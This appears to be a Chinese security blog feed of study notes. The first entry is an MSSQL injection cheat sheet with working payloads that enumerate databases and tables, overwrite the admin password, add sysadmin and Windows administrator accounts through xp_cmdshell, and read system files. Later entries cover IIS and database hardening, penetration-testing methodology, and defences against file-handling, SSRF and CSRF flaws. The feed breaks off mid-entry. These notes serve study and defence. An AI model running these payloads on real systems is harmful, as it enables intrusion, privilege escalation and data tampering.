class="line">mysql:shema</span><br><span class="line">access:mssysobjects</span><br></pre></td></tr></table></figure><h3 id="2-判断版本号："><a href="#2-判断版本号：" class="headerlink" title="2.判断版本号："></a>2.判断版本号：</h3><p>（sqlserver:2000）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nt5.0:win2000,nt5.2:2003 nt6.1:win7 sp</span><br><span class="line">and @@version&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="3-当前连接数据库的用户："><a href="#3-当前连接数据库的用户：" class="headerlink" title="3.当前连接数据库的用户："></a>3.当前连接数据库的用户：</h3><p>（dbo=sa）<br><code>and user&gt;0</code></p><h3 id="4-判断当前连接的数据库："><a href="#4-判断当前连接的数据库：" class="headerlink" title="4.判断当前连接的数据库："></a>4.判断当前连接的数据库：</h3><p>(article)<br><code>and db_name()&gt;0</code></p><h3 id="5-判断其它数据库"><a href="#5-判断其它数据库" class="headerlink" title="5.判断其它数据库"></a>5.判断其它数据库</h3><p><code>and (select name from master..sysdatabases where dbid=6)&gt;0</code></p><h3 id="6-判断表："><a href="#6-判断表：" class="headerlink" title="6.判断表："></a>6.判断表：</h3><p>‘t_jiaozhu’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="7-判断其它表："><a href="#7-判断其它表：" class="headerlink" title="7.判断其它表："></a>7.判断其它表：</h3><p>admin<br><code>and name not in(&#39;t_jiaozhu&#39;,&#39;Aclass&#39;)</code><br>加入到6条语句最后一个括号前：</p><h3 id="8-判断列名："><a href="#8-判断列名：" class="headerlink" title="8.判断列名："></a>8.判断列名：</h3><p>admin(usernae,password)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="9-判断值"><a href="#9-判断值" class="headerlink" title="9.判断值"></a>9.判断值</h3><p><code>and (select username from admin)&gt;0</code></p><h3 id="10-改密码："><a href="#10-改密码：" class="headerlink" title="10.改密码："></a>10.改密码：</h3><p>md5,小葵多功能转换工具：111转为md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;--</span><br></pre></td></tr></table></figure></p><p>sqlserver高级操作：</p><h1 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h1><h3 id="一。数据库提权："><a href="#一。数据库提权：" class="headerlink" title="一。数据库提权："></a>一。数据库提权：</h3><h4 id="1-添加数据库的用户；"><a href="#1-添加数据库的用户；" class="headerlink" title="1.添加数据库的用户；"></a>1.添加数据库的用户；</h4><p><code>;exec master..sp_addlogin hyq,888888;--</code></p><h4 id="2-查看："><a href="#2-查看：" class="headerlink" title="2.查看："></a>2.查看：</h4><p><code>mssqlserver--企业管理器--安全性--登录</code></p><h4 id="3-提权："><a href="#3-提权：" class="headerlink" title="3.提权："></a>3.提权：</h4><p>把hyq加入sysadmin组<br><code>;exec master..sp_addsrvrolemember hyq,sysadmin;--</code></p><h4 id="4-利用："><a href="#4-利用：" class="headerlink" title="4.利用："></a>4.利用：</h4><p>数据库连接工具：查询分析器,navicat:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete from </span><br><span class="line">drop database</span><br></pre></td></tr></table></figure></p><h3 id="二。操作系统提权"><a href="#二。操作系统提权" class="headerlink" title="二。操作系统提权"></a>二。操作系统提权</h3><h4 id="1-新建用户"><a href="#1-新建用户" class="headerlink" title="1.新建用户:"></a>1.新建用户:</h4><p><code>;exec master..xp_cmdshell &#39;net user cisp 888888 /add &#39;--</code></p><h4 id="2-提权："><a href="#2-提权：" class="headerlink" title="2.提权："></a>2.提权：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;--</span><br></pre></td></tr></table></figure><h4 id="3-利用："><a href="#3-利用：" class="headerlink" title="3.利用："></a>3.利用：</h4><p>3389;ipc空连接</p><h3 id="三。读系统文件"><a href="#三。读系统文件" class="headerlink" title="三。读系统文件"></a>三。读系统文件</h3><p><code>c:\boot.ini</code></p><h4 id="1-数据连接工具：navicat"><a href="#1-数据连接工具：navicat" class="headerlink" title="1.数据连接工具：navicat:"></a>1.数据连接工具：navicat:</h4><h4 id="2-查询–新建查询"><a href="#2-查询–新建查询" class="headerlink" title="2.查询–新建查询"></a>2.查询–新建查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table jjboot(line varchar(5000));</span><br><span class="line">bulk insert jjboot from &apos;c:\boot.ini&apos;;</span><br><span class="line">select * from jjboot</span><br></pre></td></tr></table></figure><h3 id="四。向系统写文件"><a href="#四。向系统写文件" class="headerlink" title="四。向系统写文件"></a>四。向系统写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;--</span><br><span class="line">a.bat</span><br><span class="line">:1</span><br><span class="line">start iexplore.exe</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure><h3 id="五。xp-cmdshell防御："><a href="#五。xp-cmdshell防御：" class="headerlink" title="五。xp_cmdshell防御："></a>五。xp_cmdshell防御：</h3><h4 id="1-删除："><a href="#1-删除：" class="headerlink" title="1.删除："></a>1.删除：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br></pre></td></tr></table></figure><h4 id="2-恢复："><a href="#2-恢复：" class="headerlink" title="2.恢复："></a>2.恢复：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br></pre></td></tr></table></figure><h4 id="3-防xp-cmdshell"><a href="#3-防xp-cmdshell" class="headerlink" title="3.防xp_cmdshell."></a>3.防xp_cmdshell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">防未公布：cmd反弹</span><br><span class="line">c:\windows\system32\cmd.exe</span><br><span class="line">删除所有默认权限，添加administrator--完全控制</span><br></pre></td></tr></table></figure><h3 id="六-防注入："><a href="#六-防注入：" class="headerlink" title="六.防注入："></a>六.防注入：</h3><h4 id="1-脚本调用："><a href="#1-脚本调用：" class="headerlink" title="1.脚本调用："></a>1.脚本调用：</h4><p>编写防注入脚本：noinject.asp<br>过滤关键字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and or union ; &apos; sp_ xp_ update</span><br><span class="line">exec select delete drop</span><br><span class="line">防post get cookie</span><br></pre></td></tr></table></figure></p><p>判断哪个脚本有漏洞<br>调用：<code>include file=noinject.asp</code><br>最前面：搜索型</p><h4 id="2-安全编码："><a href="#2-安全编码：" class="headerlink" title="2.安全编码："></a>2.安全编码：</h4><p>int–&gt;cint,参数化查询：</p><h4 id="3-waf"><a href="#3-waf" class="headerlink" title="3.waf:"></a>3.waf:</h4><p>web app fw: 软件，硬件<br>sqlmap:tamper:base<br>通配符：cat ??t /etc/passwd<br>as /**/<br>hash:<br>sqlmap.py -u url -v 3</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>web终极加固</title>
    <link href="http://yoursite.com/2018/08/21/web%E7%BB%88%E6%9E%81%E5%8A%A0%E5%9B%BA-mssqlserver/"/>
    <id>http://yoursite.com/2018/08/21/web终极加固-mssqlserver/</id>
    <published>2018-08-21T14:18:05.000Z</published>
    <updated>2018-08-23T14:40:21.488Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-134.png" alt="upload successful"></p><h2 id="一-中间件加固：tomcat-weblogic-iis"><a href="#一-中间件加固：tomcat-weblogic-iis" class="headerlink" title="一.中间件加固：tomcat,weblogic,iis"></a>一.中间件加固：tomcat,weblogic,iis</h2><p>iis服务管理器-网站–dvbbs–右键–属性</p><h4 id="1-更改默认日志的路径："><a href="#1-更改默认日志的路径：" class="headerlink" title="1.更改默认日志的路径："></a>1.更改默认日志的路径：</h4><p>c:\windows\system32\logfiles:改为d:\dvbbslog:仅system可读写，administrator:读</p><p>日志存放&gt;6个月      w3c:  biglog（日志分析）   ,splunk(日志分析)</p><p>网站–属性</p><h3 id="2-高级：必选协议版本："><a href="#2-高级：必选协议版本：" class="headerlink" title="2.高级：必选协议版本："></a>2.高级：必选协议版本：</h3><p>客户端，cookie:取证</p><p>wireshark:</p><h4 id="3-不要给写入权限："><a href="#3-不要给写入权限：" class="headerlink" title="3.不要给写入权限："></a>3.不要给写入权限：</h4><p>防上传webshell:<br>主目录</p><h4 id="4-不要给目录浏览权限："><a href="#4-不要给目录浏览权限：" class="headerlink" title="4.不要给目录浏览权限："></a>4.不要给目录浏览权限：</h4><p>产生目录遍历</p><p>主目录：</p><h4 id="5-删除不必要映射："><a href="#5-删除不必要映射：" class="headerlink" title="5.删除不必要映射："></a>5.删除不必要映射：</h4><p>主目录–配置：不用到扩展名映射删除，上传.cer</p><h4 id="6-向客户端发送自定义错误信息："><a href="#6-向客户端发送自定义错误信息：" class="headerlink" title="6.向客户端发送自定义错误信息："></a>6.向客户端发送自定义错误信息：</h4><p>反制黑客：<code>&lt;iframe src=http://ip&gt;&lt;/iframe&gt;</code></p><p>主目录–配置–调试：</p><h4 id="7-中层安全策略："><a href="#7-中层安全策略：" class="headerlink" title="7.中层安全策略："></a>7.中层安全策略：</h4><p>限制后台登录ip:<br>admin右键–目录安全性–ip或域名限制<br>允许：192.168.2.6</p><h4 id="8-删除所有自定义错误信息：防黑客："><a href="#8-删除所有自定义错误信息：防黑客：" class="headerlink" title="8.删除所有自定义错误信息：防黑客："></a>8.删除所有自定义错误信息：防黑客：</h4><p>302：挂马页面<br>C:\WINDOWS\help\iisHelp\common\</p><h2 id="二-数据库加固"><a href="#二-数据库加固" class="headerlink" title="二.数据库加固"></a>二.数据库加固</h2><h4 id="1-安全架构："><a href="#1-安全架构：" class="headerlink" title="1.安全架构："></a>1.安全架构：</h4><p>禁止数据库和web同台，web–&gt;dmz,ids,数据库内网</p><h4 id="2-数据库加固："><a href="#2-数据库加固：" class="headerlink" title="2.数据库加固："></a>2.数据库加固：</h4><h5 id="a-鉴别："><a href="#a-鉴别：" class="headerlink" title="a.鉴别："></a>a.鉴别：</h5><p>单因素，双因素：网银：<br>who:你是谁：生物特征，指纹，虹膜，视网膜<br>错误接受率小，交叉错判率小<br>have:卡，证书<br>know:知识，口令，密保问题</p><p>pin码，指纹<br>密码：8-10-14 量子 ecc,rsa</p><h5 id="b-授权：访问控制："><a href="#b-授权：访问控制：" class="headerlink" title="b.授权：访问控制："></a>b.授权：访问控制：</h5><p>最小特权：<br>dac:自主访问：ACL:访问控制列表：客体：文件<br>cl:能力表：主体：用户<br>mac:强制访问：敏感标签：文件：绝密，用户：绝密 安全模型：blp:机密性：禁止上读下写<br>rbac:基于角色:最小特权<br>group:<br>基于上下文：TCP,基于时间，基于内容：邮件过滤<br>everyone,administrators,users</p><h5 id="c-完整性：hash-摘要"><a href="#c-完整性：hash-摘要" class="headerlink" title="c.完整性：hash:摘要"></a>c.完整性：hash:摘要</h5><p>任意长度的消息生成 等长的摘要<br>两个不同的消息产生相同的摘要：碰撞<br>md5:10^42,10^21,10^10 128<br>sha1:160<br>sha256<br>过杀毒软件：<br>头同尾不同，md5相同：<br>头不同尾相同，md5相同</p><h5 id="d-机密性：加密"><a href="#d-机密性：加密" class="headerlink" title="d.机密性：加密"></a>d.机密性：加密</h5><p>https:ssl:安全套接层：握手：身份认证及算法密钥协商，记录：加密<br>cipher suite:算法套件<br>ecdhe(密钥交换)-RSA(签名)-AES(加密)-sha256<br>降级：ecdhe-rsa-3des-md5<br>ssl strip:中间人<br><a href="http://www.taobao.com" target="_blank" rel="noopener">http://www.taobao.com</a><br>arp -a:ip–mac:攻击者<br>ssldos:<br>算法弱点：drown rsa<br>rsa:伪随机数算法：后门：ec-dual-drbg:NSA:-1000万美元，常量–推出密钥，bsafe:<br>高级会话复制：黑产<br>证书伪造<br>证书劫持<br>ukey高级克隆，远程映射，内存泄露<br>网银大盗：3 UKEY</p><h5 id="E-抗抵赖："><a href="#E-抗抵赖：" class="headerlink" title="E:抗抵赖："></a>E:抗抵赖：</h5><p>数字签名：私钥+hash 伪造<br>粒度越小越灵活越安全<br>库—表：行，列：学生，老师，<br>事前检测：运行环境漏洞；数据库漏洞：<br>事中监测：sql语句：查询，返回<br>事后审计：日志</p><h4 id="3-更改默认数据库名字及路径：数据库的配置文件"><a href="#3-更改默认数据库名字及路径：数据库的配置文件" class="headerlink" title="3.更改默认数据库名字及路径：数据库的配置文件"></a>3.更改默认数据库名字及路径：数据库的配置文件</h4><p>防下载：数据库重定向到url:<a href="http://www.dvbbs.com" target="_blank" rel="noopener">http://www.dvbbs.com</a><br>iis服务管理器–网站-dvbbs–data–dvbbs7.mdb<br>右键–重定向到url</p><h2 id="三-权限加固："><a href="#三-权限加固：" class="headerlink" title="三.权限加固："></a>三.权限加固：</h2><p>网站源码目录：c:\bbsbak–右键–安全 ntfs</p><p>1.删除所有默认权限<br>2.添加administrator:完全控制<br>3.添加iis_wpg:完全控制<br>4.添加iusr_benet:只读<br>5.判断哪些目录需要写入权限<br>upload,data,databackup,uploadface—给iusr_benet 写入<br>防webshell<br>6.给以上有写入目录权限的文件夹，执行权限：无<br>iis服务管理器–网站—dvbbs–uploadface–右键–目录–执行权限：无</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试流程</title>
    <link href="http://yoursite.com/2018/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/08/21/渗透测试流程/</id>
    <published>2018-08-21T13:37:05.000Z</published>
    <updated>2018-08-21T14:45:53.178Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-106.png" alt="upload successful"></p><h1 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h1><p>通过实际的攻击进行安全测试与评估的方法</p><p>渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与相应过程中的操作性弱点等</p><h1 id="测试分类"><a href="#测试分类" class="headerlink" title="测试分类"></a>测试分类</h1><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p><h5 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h5><p>完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标组织进行逐步的渗透与入侵，揭示目标网络中的一些一直活的安全漏洞，并评估。黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。</p><h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>费时费力 需要高技术  </p><h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>渗透测试者在拥有客户组织所有知识的情况下所进行的渗透测试</p><h5 id="优点：-1"><a href="#优点：-1" class="headerlink" title="优点："></a>优点：</h5><p>可以了解到关于目标环境的所有内部与底层知识 因此最小代价发现和验证系统中最严重的安全漏洞。时间少代价低  </p><h5 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h5><p>最大的问题是无法有效的测试客户组织的应急响应程序 也无法判断出他们的安全防护计划对检测特定攻击的效率 </p><h4 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h4><p>黑白组合可以提供对目标系统更加深入和全面的安全审查</p><h1 id="渗透测试执行标准"><a href="#渗透测试执行标准" class="headerlink" title="渗透测试执行标准"></a>渗透测试执行标准</h1><p>安全测试方法学开源手册（osstmm） </p><p>网络安全测试指南（NIST SP 800-42） </p><p>OWASP十大Web应用安全威胁项目     </p><p>Web安全威胁分类标准（WASC-TC）  </p><p>完整方法论：PTES 渗透测试执行标准 (Penetration Testing Execution Standard)</p><h1 id="PTES渗透测试执行标准"><a href="#PTES渗透测试执行标准" class="headerlink" title="PTES渗透测试执行标准"></a>PTES渗透测试执行标准</h1><h4 id="1-前期交互阶段-Pre-Engagement-Interaction"><a href="#1-前期交互阶段-Pre-Engagement-Interaction" class="headerlink" title="1.前期交互阶段(Pre-Engagement Interaction)"></a>1.前期交互阶段(Pre-Engagement Interaction)</h4><p>渗透测试团队与客户组织进行交互讨论，最重要的是确定测试范围、目标、限制条件以及服务合同细节。该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p><h4 id="2情报搜集阶段（Informatin-Gathering）"><a href="#2情报搜集阶段（Informatin-Gathering）" class="headerlink" title="2情报搜集阶段（Informatin Gathering）"></a>2情报搜集阶段（Informatin Gathering）</h4><p>在目标范围确定后，渗透测试团队可以利用各种信息来源与收集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。可以使用的情报搜集方法包括公开来源的信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务检查等，情报搜集是否充分在很大程度上决定了渗透测试的成败。</p><h4 id="3威胁建模阶段（Threat-Modeling）"><a href="#3威胁建模阶段（Threat-Modeling）" class="headerlink" title="3威胁建模阶段（Threat Modeling）"></a>3威胁建模阶段（Threat Modeling）</h4><p>在搜集到充分的情报信息之后，大家聚集到一起针对获取的信息进行威胁建模与攻击规划，通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道</p><h4 id="4-漏洞分析阶段（Vulnerablity-Analysis）"><a href="#4-漏洞分析阶段（Vulnerablity-Analysis）" class="headerlink" title="4.漏洞分析阶段（Vulnerablity Analysis）"></a>4.漏洞分析阶段（Vulnerablity Analysis）</h4><p>在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，希望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><h4 id="5-渗透攻击阶段（Exploitation）"><a href="#5-渗透攻击阶段（Exploitation）" class="headerlink" title="5.渗透攻击阶段（Exploitation）"></a>5.渗透攻击阶段（Exploitation）</h4><p>在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。<br>渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸（清除痕迹），从而避免造成目标组织安全响应团队的警觉和发现。 </p><h4 id="6-后渗透测试阶段（Post-Exploitation）"><a href="#6-后渗透测试阶段（Post-Exploitation）" class="headerlink" title="6.后渗透测试阶段（Post Exploitation）"></a>6.后渗透测试阶段（Post Exploitation）</h4><p>在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。</p><p>假设测试对象为一个软件开发企业，核心业务是定制开发软件，渗透测试者可能拿到web权限，能否修改下载链接中的程序源码植入后门呢，造成的是企业声誉的影响。</p><h4 id="7-报告阶段（Reporting）"><a href="#7-报告阶段（Reporting）" class="headerlink" title="7.报告阶段（Reporting）"></a>7.报告阶段（Reporting）</h4><p>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和挖掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p><p>比如，一个sql注入漏洞，一般报告中会写出，对所有用户输入进行检查过滤，使用参数化的sql查询语句，在一个受限的用户账户上运行sql语句，以及使用定制的出错消息。但从客户角度按此修补并不完全，根本原因很可能是采用了不安全的第三方应用或者由不可控第三方开发</p><h1 id="安全漏洞的生命周期"><a href="#安全漏洞的生命周期" class="headerlink" title="安全漏洞的生命周期"></a>安全漏洞的生命周期</h1><h4 id="一个典型的安全漏洞的生命周期分为七个部分："><a href="#一个典型的安全漏洞的生命周期分为七个部分：" class="headerlink" title="一个典型的安全漏洞的生命周期分为七个部分："></a>一个典型的安全漏洞的生命周期分为七个部分：</h4><p>1.安全漏洞的挖掘与研究</p><p>2.渗透代码的开发与测试</p><p>3.安全漏洞与渗透代码在封闭团队内流传，截止到这个阶段为oday</p><p>4.安全漏洞与渗透代码开始扩散</p><p>5.恶意程序出现开始传播，厂商发布补丁</p><p>6.渗透代码/恶意程序大规模传播并开始危害互联网，危害达到巅峰</p><p>7.渗透代码/恶意程序/攻击工具逐渐消亡</p><h4 id="安全漏洞生命周期示意图"><a href="#安全漏洞生命周期示意图" class="headerlink" title="安全漏洞生命周期示意图"></a>安全漏洞生命周期示意图</h4><p><img src="\images\pasted-103.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件处理漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/文件处理漏洞/</id>
    <published>2018-08-21T12:53:05.000Z</published>
    <updated>2018-08-21T13:31:18.199Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-102.png" alt="upload successful"></p><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><p>文件处理漏洞分为：任意文件上传漏洞和任意文件下载漏洞</p><h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>web应用程序在处理用户上传的文件时，解析了用户上传的恶意脚本文件，导致用户可以直接控制web服务器</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>文件上传时检查不严</p><p>文件上传后对文件名处理不当，允许用户修改文件名的后缀</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>对文件类型进行限制</p><p>对文件名后缀进行限制，采用白名单</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>文件上传目录设置为不可执行</p><p>判断文件的类型，采用白名单策略</p><p>采用随机数来存储文件名</p><p>单独设置文件服务器域名，这个服务器不能运行动态的网页</p><h1 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>网站对用户查看或下载的文件没有做限制，则恶意用户可以查看或下载任意敏感文件，下载系统的配置文件、源代码等，从而获得更多的漏洞</p><h3 id="可能存在的漏洞位置"><a href="#可能存在的漏洞位置" class="headerlink" title="可能存在的漏洞位置"></a>可能存在的漏洞位置</h3><p>导入文件时，直接输入文件名，则可能有注入点</p><p>代码中查看危险函数，如php中的readfile、fopen、file_get_contents</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>过滤.(点)，使用户不能在url中回溯上级目录</p><p>严格判断用户输入参数的格式</p><p>限制文件的访问范围，如php.ini中配置open_basedir</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>请求伪造漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/请求伪造漏洞/</id>
    <published>2018-08-21T11:56:05.000Z</published>
    <updated>2018-08-21T12:45:35.135Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-99.png" alt="upload successful"></p><p>请求伪造漏洞，分为服务端请求伪造漏洞（SSRF）和跨站请求伪造漏洞（CSRF）</p><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务端请求伪造漏洞是一种构造由服务端发起请求的一种安全漏洞，SSRF攻击的目标是从外网无法访问的内部系统，很多web应用都提供从其他服务器上获取数据的功能，使用用户指定的URL，web应用可以下载文件，读取文件内容，攻击者恶意利用存在缺陷的web应用作为代理来攻击远程和本地的服务器。</p><p>如果应用对用户的url和远程返回的信息没有进行验证和过滤，就可能存在这种服务端请求伪造攻击。</p><p>该攻击主要为绕过网络限制，攻击企业内网。</p><h3 id="攻击过程图"><a href="#攻击过程图" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-100.png" alt="upload successful"></p><h3 id="可以实现的攻击"><a href="#可以实现的攻击" class="headerlink" title="可以实现的攻击"></a>可以实现的攻击</h3><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><p>端口扫描，获取banner信息，对内网应用进行指纹识别，file协议读取本地文件</p><h5 id="执行指令："><a href="#执行指令：" class="headerlink" title="执行指令："></a>执行指令：</h5><p>利用get参数，攻击内外网应用程序</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>过滤返回的信息</p><p>统一错误信息</p><p>限制请求端口为http常用端口</p><p>采用黑名单禁止访问内网IP</p><p>禁用不必要的协议</p><h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>攻击者利用用户的身份发起了用户不知道的请求，比如发个信息，发个留言</p><p>包括但不限于：</p><p>以用户名义发邮件</p><p>发消息</p><p>盗账号</p><p>购买商品</p><p>虚拟货币转账</p><h3 id="攻击过程图-1"><a href="#攻击过程图-1" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-101.png" alt="upload successful"></p><p>所需的特定条件：</p><p>受害者必须登录过正常的网站</p><p>受害者必须打开黑客提供的恶意链接</p><p>网站没有如验证码之类的特殊验证方法</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><h5 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h5><p>最简洁有效的防御方法，CSRF的攻击过程，往往是在用户不知情的情况下构造网络请求，验证码则要求用户必须与应用进行交互。出于用户体验考虑，验证码只能作为一种辅助手段</p><h5 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer  Check"></a>Referer  Check</h5><p>Referer  Check最常见的应用是图片盗链，同样可以用来检查请求是否来自合法的源，Referer  Check的缺陷在于并非什么时候都能取到referer，用户有时出于隐私保护考虑，会禁止referer的发送</p><h5 id="Anti-CSRF-token"><a href="#Anti-CSRF-token" class="headerlink" title="Anti  CSRF  token"></a>Anti  CSRF  